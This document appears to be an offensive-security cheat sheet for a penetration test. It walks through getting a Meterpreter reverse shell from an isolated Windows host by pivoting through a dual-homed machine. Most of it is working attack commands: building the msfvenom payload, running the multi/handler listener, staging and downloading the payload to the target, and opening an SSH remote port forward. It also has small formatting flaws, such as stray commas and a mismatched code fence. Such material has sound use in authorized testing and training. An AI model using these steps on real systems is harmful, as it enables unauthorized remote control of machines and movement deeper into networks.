## Reverse Shell via SSH Remote Port Forwarding

**When to use** Target host is isolated from the attack network and cannot route traffic to `<ATTACK_IP>`, requiring a dual-homed pivot host to proxy the reverse connection,.

**Commands**

1. Generate payload configured to call back to the pivot host's internal interface

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<PIVOT_IP> LPORT=<PIVOT_PORT> -f exe -o <FILE_PATH>
```

2. Configure multi/handler to listen on all local interfaces

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport <ATTACK_PORT>
run
```

3. Transfer payload to pivot host

```
scp <FILE_PATH> <USERNAME>@<PIVOT_IP>:~/
```

4. Start web server on pivot to facilitate download to the final target

```
python3 -m http.server <PORT>
```

5. Download payload on target via PowerShell

```
Invoke-WebRequest -Uri "http://<PIVOT_IP>:<PORT>/<FILE_PATH>" -OutFile "C:\<FILE_PATH>"
```

6. Establish remote port forward to map the pivot's listening port to the attack host's listener

````
ssh -R <PIVOT_IP>:<PIVOT_PORT>:0.0.0.0:<ATTACK_PORT> <USERNAME>@<PIVOT_IP> -vN
```,

**Gotchas**
- **LHOST must be set to the Pivot IP** in the payload generation, not the attack host, or the target will attempt to route to an unreachable network,.
- **Incoming connection appears as 127.0.0.1** in Meterpreter because the traffic is received over a local SSH socket,.
- **SSH -vN flags** are used to provide verbosity for troubleshooting and suppress the login shell to maintain the tunnel only.

> ⚠️ Gap: Remote port forwarding to a specific interface (e.g., `<PIVOT_IP>`) typically requires **GatewayPorts** to be enabled in the pivot's `sshd_config`; otherwise, the port may only bind to the loopback interface, causing the target's connection to be refused.
````